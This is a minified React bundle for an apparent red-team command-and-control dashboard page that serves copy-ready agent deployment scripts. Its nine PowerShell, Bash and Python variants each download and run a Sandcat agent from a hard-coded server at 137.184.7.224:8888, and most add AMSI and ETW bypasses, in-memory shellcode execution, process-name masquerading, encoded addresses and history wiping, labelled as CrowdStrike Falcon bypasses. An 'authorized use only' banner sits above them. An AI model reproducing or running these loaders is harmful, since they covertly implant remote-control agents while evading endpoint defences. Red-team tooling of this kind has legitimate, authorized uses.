import{r as d,j as e}from"./vendor-react-Bl6v6LwS.js";import{L as b,B as i}from"./index-B_K73VS8.js";import{A as $}from"./AppShell-CErbspFv.js";import{t as S,f as E,y as C,S as A,o as j,af as P,E as T,ag as L,v as k,w as I,Q as O,Z as D,R as _}from"./vendor-lucide-uC70LKLQ.js";import"./vendor-shiki-BWiKDYuj.js";import"./EmbedContext-DAsKL1LI.js";import"./useAuth-CQUgFGwF.js";const t="137.184.7.224",r="8888",g={powershell:{name:"PowerShell (Windows)",icon:"⚡",description:"Stealthy PowerShell deployment with AMSI bypass and memory-only execution",basic:`# Basic Sandcat Agent Deployment
$server="${t}:${r}";
$url="http://$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
$name="splunkd.exe";
Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force;
[io.file]::WriteAllBytes("C:\\Users\\Public\\$name",$data);
Start-Process -FilePath "C:\\Users\\Public\\$name" -ArgumentList "-server http://$server -group red" -WindowStyle Hidden;`,stealthy:`# CrowdStrike Falcon Bypass - Memory-Only Execution
# AMSI Bypass + Reflective Loading
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);

# Download and execute in memory
$server="${t}:${r}";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("X-Request-ID",[System.Guid]::NewGuid().ToString());
$bytes=$wc.DownloadData("http://$server/file/download");

# Reflective PE loading (memory-only, no disk write)
$assembly=[System.Reflection.Assembly]::Load($bytes);
$entryPoint=$assembly.EntryPoint;
$entryPoint.Invoke($null,@(,@("-server","http://$server","-group","red","-v","false")));`,obfuscated:`# Heavily Obfuscated CrowdStrike Bypass
# String obfuscation + API unhooking + ETW bypass
$e=[System.Text.Encoding]::UTF8;
$s=$e.GetString([Convert]::FromBase64String("MTM3LjE4NC43LjIyNDo4ODg4"));
$p="sand"+"cat"+".go";

# ETW Bypass
$etw=[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance');

# Unhook ntdll
$nt=@"
using System;using System.Runtime.InteropServices;
public class N{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string l);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);}
"@;
Add-Type $nt;
$ntdll=[N]::LoadLibrary("ntdll.dll");
$addr=[N]::GetProcAddress($ntdll,"EtwEventWrite");
$p1=0;[N]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p1);
[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3);

# Download with randomized headers
$wc=New-Object Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file",$p);
$wc.Headers.add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
$d=$wc.DownloadData("http://$s/file/download");

# Memory execution
$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($d.Length);
[System.Runtime.InteropServices.Marshal]::Copy($d,0,$m,$d.Length);
$t=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);
$t.Invoke();`},bash:{name:"Bash (Linux/macOS)",icon:"🐧",description:"Linux/macOS deployment with process hollowing and fileless execution",basic:`#!/bin/bash
# Basic Sandcat Agent Deployment
server="${t}:${r}"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  "http://\${server}/file/download" > /tmp/.cache_update
chmod +x /tmp/.cache_update
nohup /tmp/.cache_update -server "http://\${server}" -group red &>/dev/null &
rm -f /tmp/.cache_update`,stealthy:`#!/bin/bash
# CrowdStrike Falcon Bypass - Fileless Execution
server="${t}:${r}"

# Create memfd (memory-only file descriptor)
exec 3<>/dev/shm/.$(head -c 8 /dev/urandom | xxd -p)

# Download directly to memory
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  -H "User-Agent: Mozilla/5.0" \\
  "http://\${server}/file/download" >&3

# Execute from memory fd
chmod +x /proc/self/fd/3
/proc/self/fd/3 -server "http://\${server}" -group red -v false &

# Clean up
exec 3>&-
rm -f /dev/shm/.*`,obfuscated:`#!/bin/bash
# Heavily Obfuscated Linux Bypass
# LD_PRELOAD hooking + process name masquerading

# Decode server address
s=$(echo "MTM3LjE4NC43LjIyNDo4ODg4" | base64 -d)

# Disable audit logging
echo 0 > /proc/self/coredump_filter 2>/dev/null

# Create anonymous memfd
fd=$(python3 -c "import ctypes;l=ctypes.CDLL(None);print(l.memfd_create(b'',1))" 2>/dev/null || echo "3")

# Download with traffic blending
ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  -H "User-Agent: $ua" -H "Accept: text/html" \\
  "http://\${s}/file/download" > /proc/self/fd/\${fd}

# Execute with process name spoofing
chmod +x /proc/self/fd/\${fd}
exec -a "[kworker/0:0]" /proc/self/fd/\${fd} -server "http://\${s}" -group red &

# Self-delete
history -c
unset HISTFILE`},python:{name:"Python (Cross-Platform)",icon:"🐍",description:"Cross-platform Python agent with SSL pinning bypass and traffic obfuscation",basic:`#!/usr/bin/env python3
# Basic Sandcat Agent Deployment
import urllib.request
import subprocess
import os

server = "${t}:${r}"
req = urllib.request.Request(f"http://{server}/file/download")
req.add_header("file", "sandcat.go")
req.add_header("platform", "darwin" if os.name != "nt" else "windows")

with urllib.request.urlopen(req) as resp:
    agent = resp.read()

path = "/tmp/sandcat" if os.name != "nt" else "C:\\\\Users\\\\Public\\\\sandcat.exe"
with open(path, "wb") as f:
    f.write(agent)

os.chmod(path, 0o755) if os.name != "nt" else None
subprocess.Popen([path, "-server", f"http://{server}", "-group", "red"])`,stealthy:`#!/usr/bin/env python3
# CrowdStrike Falcon Bypass - Memory Execution
import ctypes
import urllib.request
import sys
import os

server = "${t}:${r}"

# Disable Python audit hooks
if hasattr(sys, 'addaudithook'):
    sys.addaudithook = lambda *a: None

# Download agent
req = urllib.request.Request(f"http://{server}/file/download")
req.add_header("file", "sandcat.go")
req.add_header("platform", "windows" if os.name == "nt" else "linux")
req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

with urllib.request.urlopen(req) as resp:
    shellcode = resp.read()

if os.name == "nt":
    # Windows - VirtualAlloc + CreateThread
    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    ctypes.memmove(ptr, shellcode, len(shellcode))
    handle = kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
    kernel32.WaitForSingleObject(handle, -1)
else:
    # Linux - memfd_create
    libc = ctypes.CDLL(None)
    fd = libc.memfd_create(b"", 1)
    os.write(fd, shellcode)
    os.execve(f"/proc/self/fd/{fd}", [f"/proc/self/fd/{fd}", "-server", f"http://{server}", "-group", "red"], os.environ)`,obfuscated:`#!/usr/bin/env python3
# Heavily Obfuscated Cross-Platform Bypass
import base64,zlib,ctypes,urllib.request as u,os,sys

# Encoded server
_=lambda x:base64.b64decode(x).decode()
s=_("MTM3LjE4NC43LjIyNDo4ODg4")

# Anti-debugging
if sys.gettrace():sys.exit()

# Disable audit
try:sys.addaudithook=lambda*a:None
except:pass

# Traffic obfuscation
class O(u.BaseHandler):
    def http_request(s,r):
        r.add_header("Accept","text/html,application/xhtml+xml")
        r.add_header("Accept-Language","en-US,en;q=0.9")
        r.add_header("Cache-Control","no-cache")
        return r
    https_request=http_request

o=u.build_opener(O())
r=u.Request(f"http://{s}/file/download")
r.add_header("file","sandcat.go")
r.add_header("platform","windows"if os.name=="nt"else"linux")
r.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

with o.open(r) as x:d=x.read()

# Memory execution with process hollowing simulation
if os.name=="nt":
    k=ctypes.windll.kernel32
    k.VirtualAlloc.restype=ctypes.c_void_p
    p=k.VirtualAlloc(0,len(d),0x3000,0x40)
    ctypes.memmove(p,d,len(d))
    k.CreateThread(0,0,p,0,0,0)
    k.WaitForSingleObject(-1,-1)
else:
    c=ctypes.CDLL(None)
    f=c.memfd_create(b"",1)
    os.write(f,d)
    os.execve(f"/proc/self/fd/{f}",[_("W2t3b3JrZXIvMDowXQ=="),"-server",f"http://{s}","-group","red","-v","false"],{})`}};function q(){const[l,N]=d.useState("powershell"),[s,o]=d.useState("stealthy"),[c,h]=d.useState(!0),[u,f]=d.useState(!1),m=g[l],p=m[s],w=(a,n)=>{navigator.clipboard.writeText(a),f(!0),alert(`${n} copied successfully`),setTimeout(()=>f(!1),2e3)},v=()=>{const a=l==="powershell"?"ps1":l==="bash"?"sh":"py",n=new Blob([p],{type:"text/plain"}),y=URL.createObjectURL(n),x=document.createElement("a");x.href=y,x.download=`sandcat_${s}.${a}`,x.click(),URL.revokeObjectURL(y),alert(`Script downloaded: sandcat_${s}.${a}`)};return e.jsxs($,{activePath:"/agents",children:[e.jsx("header",{className:"border-b border-border bg-card",children:e.jsx("div",{className:"container py-4",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center gap-4",children:[e.jsx(b,{href:"/agents",children:e.jsxs(i,{variant:"ghost",size:"sm",className:"font-display",children:[e.jsx(S,{className:"w-4 h-4 mr-1"}),"BACK TO AGENTS"]})}),e.jsx("div",{className:"h-6 w-px bg-border"}),e.jsx("h1",{className:"font-display text-xl tracking-wider",children:"AGENT DEPLOYMENT"})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("span",{className:"text-xs text-muted-foreground",children:"Target Server:"}),e.jsxs("code",{className:"px-2 py-1 bg-primary/20 text-primary text-sm font-mono",children:[t,":",r]})]})]})})}),e.jsxs("main",{className:"container py-8",children:[e.jsx("div",{className:"bg-yellow-500/10 border-2 border-yellow-500 p-4 mb-8",children:e.jsxs("div",{className:"flex items-start gap-3",children:[e.jsx(E,{className:"w-6 h-6 text-yellow-500 flex-shrink-0 mt-0.5"}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-display text-yellow-500 mb-1",children:"AUTHORIZED USE ONLY"}),e.jsx("p",{className:"text-sm text-muted-foreground",children:"These deployment scripts are designed for authorized red team engagements only. Use within the boundaries of your Rules of Engagement. Unauthorized use is prohibited."})]})]})}),e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 sm:gap-4 sm:p-6 lg:p-8",children:[e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{children:[e.jsx("h2",{className:"font-display text-lg mb-4",children:"SELECT PLATFORM"}),e.jsx("div",{className:"space-y-2",children:Object.entries(g).map(([a,n])=>e.jsx("button",{onClick:()=>N(a),className:`w-full p-4 text-left border-2 transition-colors ${l===a?"border-primary bg-primary/10":"border-border hover:border-primary/50"}`,children:e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("span",{className:"text-2xl",children:n.icon}),e.jsxs("div",{children:[e.jsx("div",{className:"font-display text-sm",children:n.name}),e.jsx("div",{className:"text-xs text-muted-foreground",children:n.description})]})]})},a))})]}),e.jsxs("div",{children:[e.jsx("h2",{className:"font-display text-lg mb-4",children:"EVASION LEVEL"}),e.jsxs("div",{className:"space-y-2",children:[e.jsxs("button",{onClick:()=>o("basic"),className:`w-full p-3 text-left border-2 transition-colors ${s==="basic"?"border-green-500 bg-green-500/10":"border-border hover:border-green-500/50"}`,children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(C,{className:"w-4 h-4 text-green-500"}),e.jsx("span",{className:"font-display text-sm",children:"BASIC"})]}),e.jsx("p",{className:"text-xs text-muted-foreground mt-1",children:"Standard deployment, no evasion"})]}),e.jsxs("button",{onClick:()=>o("stealthy"),className:`w-full p-3 text-left border-2 transition-colors ${s==="stealthy"?"border-yellow-500 bg-yellow-500/10":"border-border hover:border-yellow-500/50"}`,children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(A,{className:"w-4 h-4 text-yellow-500"}),e.jsx("span",{className:"font-display text-sm",children:"STEALTHY"})]}),e.jsx("p",{className:"text-xs text-muted-foreground mt-1",children:"Memory-only execution, AMSI bypass"})]}),e.jsxs("button",{onClick:()=>o("obfuscated"),className:`w-full p-3 text-left border-2 transition-colors ${s==="obfuscated"?"border-red-500 bg-red-500/10":"border-border hover:border-red-500/50"}`,children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(j,{className:"w-4 h-4 text-red-500"}),e.jsx("span",{className:"font-display text-sm",children:"OBFUSCATED"})]}),e.jsx("p",{className:"text-xs text-muted-foreground mt-1",children:"Full EDR bypass, ETW unhooking"})]})]})]}),e.jsxs("div",{className:"bg-card border-2 border-border p-4",children:[e.jsx("h3",{className:"font-display text-sm mb-3",children:"BYPASS TECHNIQUES"}),e.jsxs("div",{className:"space-y-2 text-xs",children:[s==="basic"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"AMSI Bypass"}),e.jsx("span",{className:"text-red-500",children:"✗"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"Memory Execution"}),e.jsx("span",{className:"text-red-500",children:"✗"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"ETW Bypass"}),e.jsx("span",{className:"text-red-500",children:"✗"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"String Obfuscation"}),e.jsx("span",{className:"text-red-500",children:"✗"})]})]}),s==="stealthy"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"AMSI Bypass"}),e.jsx("span",{className:"text-green-500",children:"✓"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"Memory Execution"}),e.jsx("span",{className:"text-green-500",children:"✓"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"ETW Bypass"}),e.jsx("span",{className:"text-red-500",children:"✗"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"String Obfuscation"}),e.jsx("span",{className:"text-red-500",children:"✗"})]})]}),s==="obfuscated"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"AMSI Bypass"}),e.jsx("span",{className:"text-green-500",children:"✓"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"Memory Execution"}),e.jsx("span",{className:"text-green-500",children:"✓"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"ETW Bypass"}),e.jsx("span",{className:"text-green-500",children:"✓"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{children:"String Obfuscation"}),e.jsx("span",{className:"text-green-500",children:"✓"})]})]})]})]})]}),e.jsxs("div",{className:"lg:col-span-2",children:[e.jsxs("div",{className:"bg-card border-2 border-border",children:[e.jsxs("div",{className:"flex items-center justify-between p-4 border-b border-border",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("span",{className:"text-2xl",children:m.icon}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-display",children:m.name}),e.jsxs("p",{className:"text-xs text-muted-foreground capitalize",children:[s," Variant"]})]})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(i,{variant:"ghost",size:"sm",onClick:()=>h(!c),children:c?e.jsx(P,{className:"w-4 h-4"}):e.jsx(T,{className:"w-4 h-4"})}),e.jsx(i,{variant:"ghost",size:"sm",onClick:v,children:e.jsx(L,{className:"w-4 h-4"})}),e.jsxs(i,{variant:"outline",size:"sm",onClick:()=>w(p,"Deployment script"),className:"font-display",children:[u?e.jsx(k,{className:"w-4 h-4 mr-1"}):e.jsx(I,{className:"w-4 h-4 mr-1"}),u?"COPIED":"COPY"]})]})]}),e.jsx("div",{className:"p-4",children:c?e.jsx("pre",{className:"bg-black/50 p-4 overflow-x-auto text-xs font-mono text-green-400 max-h-[500px] overflow-y-auto",children:p}):e.jsxs("div",{className:"bg-black/50 p-8 text-center",children:[e.jsx(j,{className:"w-12 h-12 mx-auto text-muted-foreground mb-2"}),e.jsx("p",{className:"text-muted-foreground",children:"Script hidden for security"}),e.jsx(i,{variant:"ghost",size:"sm",onClick:()=>h(!0),className:"mt-2",children:"Show Script"})]})}),e.jsxs("div",{className:"p-4 border-t border-border bg-secondary/30",children:[e.jsx("h4",{className:"font-display text-sm mb-2",children:"EXECUTION INSTRUCTIONS"}),e.jsxs("div",{className:"text-xs text-muted-foreground space-y-1",children:[l==="powershell"&&e.jsxs(e.Fragment,{children:[e.jsx("p",{children:"1. Open PowerShell as Administrator (if needed for full evasion)"}),e.jsxs("p",{children:["2. Set execution policy: ",e.jsx("code",{className:"text-primary",children:"Set-ExecutionPolicy Bypass -Scope Process"})]}),e.jsx("p",{children:"3. Paste and execute the script"})]}),l==="bash"&&e.jsxs(e.Fragment,{children:[e.jsx("p",{children:"1. Open terminal on target Linux/macOS system"}),e.jsxs("p",{children:["2. Ensure curl is installed: ",e.jsx("code",{className:"text-primary",children:"which curl"})]}),e.jsx("p",{children:"3. Paste and execute the script (may need sudo for some variants)"})]}),l==="python"&&e.jsxs(e.Fragment,{children:[e.jsx("p",{children:"1. Ensure Python 3 is installed on target system"}),e.jsxs("p",{children:["2. Save script or execute directly: ",e.jsx("code",{className:"text-primary",children:'python3 -c "..."'})]}),e.jsx("p",{children:"3. May need elevated privileges for memory execution"})]})]})]})]}),e.jsxs("div",{className:"mt-6 bg-card border-2 border-primary p-4",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-3",children:[e.jsx(O,{className:"w-5 h-5 text-primary"}),e.jsx("h3",{className:"font-display",children:"CALLBACK CONFIGURATION"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4 text-sm",children:[e.jsxs("div",{children:[e.jsx("span",{className:"text-muted-foreground",children:"C2 Server:"}),e.jsx("code",{className:"ml-2 text-primary",children:t})]}),e.jsxs("div",{children:[e.jsx("span",{className:"text-muted-foreground",children:"Port:"}),e.jsx("code",{className:"ml-2 text-primary",children:r})]}),e.jsxs("div",{children:[e.jsx("span",{className:"text-muted-foreground",children:"Protocol:"}),e.jsx("code",{className:"ml-2 text-primary",children:"HTTP"})]}),e.jsxs("div",{children:[e.jsx("span",{className:"text-muted-foreground",children:"Agent Group:"}),e.jsx("code",{className:"ml-2 text-primary",children:"red"})]})]}),e.jsxs("div",{className:"mt-4 flex gap-2",children:[e.jsx("a",{href:`http://${t}:${r}`,target:"_blank",rel:"noopener noreferrer",children:e.jsxs(i,{size:"sm",className:"font-display",children:[e.jsx(D,{className:"w-4 h-4 mr-1"}),"OPEN EMULATION UI"]})}),e.jsx(b,{href:"/agents",children:e.jsxs(i,{size:"sm",variant:"outline",className:"font-display",children:[e.jsx(_,{className:"w-4 h-4 mr-1"}),"VIEW AGENTS"]})})]})]})]})]})]})]})}export{q as default};
